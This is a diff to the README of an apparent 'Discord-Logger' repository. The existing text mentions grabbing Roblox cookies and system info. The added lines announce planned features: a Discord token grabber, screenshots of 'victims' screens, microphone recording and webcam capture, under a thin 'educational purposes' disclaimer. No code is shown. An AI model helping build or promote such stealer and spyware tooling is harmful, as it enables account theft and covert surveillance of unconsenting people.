@@ -22,5 +22,15 @@ Roblox cookies:\
 System info:\
 ![Alt text](discord-logger-images/discord3.png?raw=true)\
 # How to Run:
-Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md
+Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md \
+\
+# Upcoming features:
+• Discord token grabber\
+• Screenshot victims screen\
+• Mic recording\
+• Webcam image\
+Thanks for checking out my repository!\
+```
+Note: This is for educational purposes, i do not condone the use of this script on people without their consent!
+```
 
